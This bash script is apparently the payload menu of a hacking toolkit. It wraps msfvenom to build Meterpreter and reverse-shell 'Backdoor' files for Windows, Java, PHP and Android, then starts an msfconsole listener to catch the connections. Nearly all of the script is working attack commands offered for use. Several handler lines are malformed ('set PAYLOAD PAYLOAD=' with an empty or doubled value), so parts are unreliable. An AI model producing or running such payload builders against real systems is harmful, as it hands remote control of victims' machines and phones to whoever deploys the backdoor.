#!/bin/bash
clear
echo "============================"
echo "Create a Payload and Listener
      Created by:Hamza.elhack
      
"
echo   "=============================="
echo "  Select from the menu:
     1. windows/meterpreter/reverse_tcp
     2. windows/reverse_shell_tcp
     3. windows/meterpreter/X64
     4. Java Meterpreter reverse
     5. PHP Meterpreter reverse
     6. android/meterpreter/reverse_tcp
     7. Return back to the main menu
     8. Exit
"
read -e elhack
echo
read -p "IP address for the payload listener :" ip
read -p "Enter the PORT for the reverse listener :" port
read -p "type where you want to save your Backdoor ?exmple /tmp/elhack.exe(java,php) :" path

echo "========================="
echo "###### please wait ######"
echo "========================="
if [[ $elhack == 1 ]]; then
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f exe -o $path 
read -p "do you want to lauch MSF Listening mod after creating Backoor if Yes click enter ? "
msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $ip; set LPORT $port; exploit "
clear
bash src/pay.sh
elif [[ $elhack == 2  ]]; then
msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=$port -f exe -o $path
read -p "do you want to lauch MSF Listening mod after creating Backoor if Yes click enter ? "
msfconsole -x "use exploit/multi/handler; set PAYLOAD PAYLOAD=; set LHOST $ip; set LPORT $port; exploit "
clear
bash src/pay.sh
elif [[ $elhack == 3 ]]; then
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f exe -o $path 
read -p "do you want to lauch MSF Listening mod after creating Backoor if Yes click enter ? "
msfconsole -x "use exploit/multi/handler; set PAYLOAD PAYLOAD=windows/x64/meterpreter/reverse_tcp; set LHOST $ip; set LPORT $port; exploit "
clear
bash src/pay.sh
elif [[ $elhack == 4 ]]; then
msfvenom -p java/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f raw -o $path
read -p "do you want to lauch MSF Listening mod after creating Backoor if Yes click enter ? "
msfconsole -x "use exploit/multi/handler; set PAYLOAD PAYLOAD=java/meterpreter/reverse_tcp; set LHOST $ip; set LPORT $port; exploit "
clear
bash src/pay.sh
elif [[ $elhack == 5 ]]; then
msfvenom -p php/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f raw -o $path
clear
bash src/pay.sh
elif [[ $elhack == 6 ]]; then
msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f raw -o $path
read -p "do you want to lauch MSF Listening mod after creating Backoor if Yes click enter ? "
msfconsole -x "use exploit/multi/handler; set PAYLOAD PAYLOAD=android/meterpreter/reverse_tcp; set LHOST $ip; set LPORT $port; exploit "
clear
bash src/pay.sh
elif [[ $elhack == 7 ]]; then
clear
./elhack.sh
elif [[ $elhack == 8 ]]; then
clear
exit


echo

else

./elhack.sh
fi
